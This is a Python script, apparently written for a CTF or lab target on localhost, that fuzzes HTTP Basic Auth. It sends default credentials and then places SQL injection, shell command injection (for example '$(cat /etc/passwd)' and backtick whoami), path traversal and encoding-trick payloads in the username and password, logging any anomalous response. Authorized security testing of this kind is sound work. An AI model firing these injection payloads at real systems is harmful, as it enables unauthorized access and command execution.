#!/usr/bin/env python3
import requests
import base64
import urllib3
import time

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "http://127.0.0.1:33189"

# Test without credentials first (baseline)
print("BASELINE TEST: No credentials")
print("-" * 80)
try:
    r = requests.get(target_url, timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Length: {len(r.text)}B")
    print(f"Response: {r.text[:200]}")
    print()
except Exception as e:
    print(f"Error: {e}\n")

# Test with valid credentials (should get 500)
print("BASELINE TEST: Valid credentials (admin:admin)")
print("-" * 80)
auth = requests.auth.HTTPBasicAuth('admin', 'admin')
try:
    r = requests.get(target_url, auth=auth, timeout=10)
    print(f"Status: {r.status_code}")
    print(f"Length: {len(r.text)}B")
    print(f"Response: {r.text[:200]}")
    standard_500 = r.text
    print()
except Exception as e:
    print(f"Error: {e}\n")
    standard_500 = ""

# Now test various malformed credentials
anomalies = []
test_count = 0

# Helper to test custom auth
def test_auth(username=None, password=None, raw_b64=None, description=""):
    global test_count
    test_count += 1
    
    headers = {}
    if raw_b64 is not None:
        headers['Authorization'] = f'Basic {raw_b64}'
    elif username is not None or password is not None:
        username_str = username if username is not None else ''
        password_str = password if password is not None else ''
        creds = f"{username_str}:{password_str}"
        encoded = base64.b64encode(creds.encode()).decode()
        headers['Authorization'] = f'Basic {encoded}'
    
    try:
        r = requests.get(target_url, headers=headers, timeout=10)
        status = r.status_code
        length = len(r.text)
        
        if status == 500 and 'standard_500' in globals() and r.text != standard_500:
            print(f"[!] {test_count}. DIFFERENT 500 - {description}")
            print(f"    Length: {length}B vs {len(standard_500)}B")
            anomalies.append((description, status, 'different_content'))
        elif status != 500:
            print(f"[!] {test_count}. ANOMALY {status} - {description}")
            print(f"    Response: {r.text[:200]}")
            anomalies.append((description, status, r.text))
        else:
            print(f"[.] {test_count}. 500 - {description}")
            
        return r
    except Exception as e:
        print(f"[X] {test_count}. ERROR - {description}: {e}")
        return None

print("STARTING CREDENTIAL MANIPULATION TESTS")
print("=" * 80)

# Test special characters
print("\n--- SPECIAL CHARACTERS ---")
test_auth("admin'or'1'='1", "pass", description="SQLi OR")
test_auth('admin"', "pass", description="Double quote")
test_auth("admin`whoami`", "pass", description="Backticks")
test_auth("admin$(whoami)", "pass", description="Dollar sub")
test_auth("admin;ls", "pass", description="Semicolon")
time.sleep(0.1)

print("\n--- SQL INJECTION PATTERNS ---")
test_auth("admin'#", "pass", description="Comment #")
test_auth('admin"--', "pass", description="Comment --")
test_auth("admin' OR '1'='1", "pass", description="OR 1=1")
test_auth("admin' UNION SELECT 1--", "pass", description="UNION")
test_auth("admin\" OR 1=1--", "pass", description="Quote bypass")
time.sleep(0.1)

print("\n--- COMMAND INJECTION ---")
test_auth("admin;$(cat /etc/passwd)", "pass", description="Semicolon cat")
test_auth("admin`|whoami`", "pass", description="Backtick id")
test_auth("admin$(id)", "pass", description="Dollar id")
test_auth("admin||/bin/bash", "pass", description="Double pipe")
time.sleep(0.1)

print("\n--- PATH TRAVERSAL ---")
test_auth("../../../../etc/passwd", "pass", description="Unix path")
test_auth("..\\\\..\\\\..\\\\..\\\\etc\\\\passwd", "pass", description="Windows path")
test_auth("..%2f..%2f..%2f..%2fetc/passwd", "pass", description="URL encoded path")
test_auth(".../.../.../.../etc/passwd", "pass", description="Triple dot")

print("\n--- NULL BYTES ---")
test_auth("admin%00", "pass", description="Null in username")
test_auth("admin", "pass%00", description="Null in password")
test_auth("admin%00", "test", description="Null username value")
test_auth("admin", "pass%00suffix", description="Null + suffix in pass")

print("\n--- EMPTY/NULL FIELDS ---")
test_auth("", "password", description="Empty username")
test_auth("username", "", description="Empty password")
test_auth("", "", description="Both empty")
test_auth(":", "pass", description="Just colon")
test_auth("::", "pass", description="Double colon")

print("\n--- EXTRA COLONS ---")
test_auth(":::admin", "pass", description="Triple colon prefix")
test_auth("admin::pass", "", description="Double colon middle")
test_auth("admin:pass:extra", "", description="Extra colon")
test_auth("::admin", "pass", description="Front colons")

print("\n--- WHITESPACE TRICKS ---")
test_auth("admin ", "pass", description="Space in username")
test_auth("admin", " pass", description="Space in password")
test_auth("admin ", " pass", description="Spaces both")
test_auth("admin  :  pass", "", description="Spaces around colon")
test_auth("admin%0a", "pass", description="URL encoded LF in user")
test_auth("admin", "%0apass", description="URL encoded LF in pass")

print("\n--- URL ENCODED VARIANTS ---")
test_auth("%61%64%6d%69%6e", "pass", description="Encoded username")
test_auth("admin", "%70%61%73%73", description="Encoded password")
test_auth("a%64min", "pass", description="Single char encoded")

print("\n--- DOUBLE ENCODING ---")
test_auth("%2561dmin", "pass", description="Partial double encoded")
test_auth("%2561%2564%256d%2569%256e", "%2570%2574%2574", description="Full double encoded")

print("\n--- UNICODE/OVERLONG ---")
test_auth("%c0%af%c0%aeetc/passwd", "pass", description="Overlong path")
test_auth("%c0%61dmin", "pass", description="Overlong admin")

print("\n--- MALFORMED BASE64 ---")
test_auth(raw_b64="YWRtaW46cGFzcw==X", description="Extra char in b64")
test_auth(raw_b64="YWRtaW46cGFzcw", description="No padding in b64")
test_auth(raw_b64="YWRtaW46", description="Truncated b64")
test_auth(raw_b64="!@#$%^&*()", description="Corrupted b64")

print("\n--- LONG STRINGS ---")
test_auth("A" * 1000, "pass", description="Username 1000 chars")
test_auth("admin", "A" * 1000, description="Password 1000 chars")
test_auth("A" * 10000, "pass", description="Username 10000 chars")

print("\n--- MIXED CASE ---")
test_auth("AdMiN", "aDmIn", description="Mixed case both")
test_auth("ADMIN", "PASS", description="All uppercase")
test_auth("admIn", "pasS", description="Mixed case 2")

print("\n--- MISSING FIELDS ---")
test_auth("admin", None, description="Missing password")
test_auth(None, "admin", description="Missing username")
test_auth(None, None, description="Both missing")

print("\n--- RAW MALFORMED ---")
test_auth(raw_b64="", description="Empty auth header")
test_auth(raw_b64="ICAK", description="Only whitespace in b64")
test_auth(raw_b64="YWRtaW46\n\ncGFzcw==", description="Newlines in b64")
test_auth(raw_b64="YWRtaW46cGFzcw==$", description="Special char in b64")

print("\n--- UNICODE CHARACTERS ---")
test_auth("αdmin", "pass", description="Greek alpha in user")
test_auth("admin", "pαss", description="Greek alpha in pass")

test_auth("admin😀", "pass", description="Emoji in username")

print("\n--- EDGE CASES ---")
test_auth("12345", "67890", description="Only numbers")
test_auth("\x00\x01\x02", "\x03\x04", description="Binary chars")
test_auth("admin\r\n", "pass\r\n", description="CRLF in both")

print("\n" + "=" * 80)
print(f"TOTAL TESTS: {test_count}")
print(f"ANOMALIES FOUND: {len(anomalies)}")
print("=" * 80)

if anomalies:
    print("\n[!!!] ANOMALIES DETAILS:")
    for desc, status, content in anomalies:
        print(f"  Status: {status} - {desc}")
        if isinstance(content, str) and len(content) > 0:
            print(f"  Response: {content[:200]}")
        print()
else:
    print("\nAll tests returned standard 500 error or no anomalies detected.")
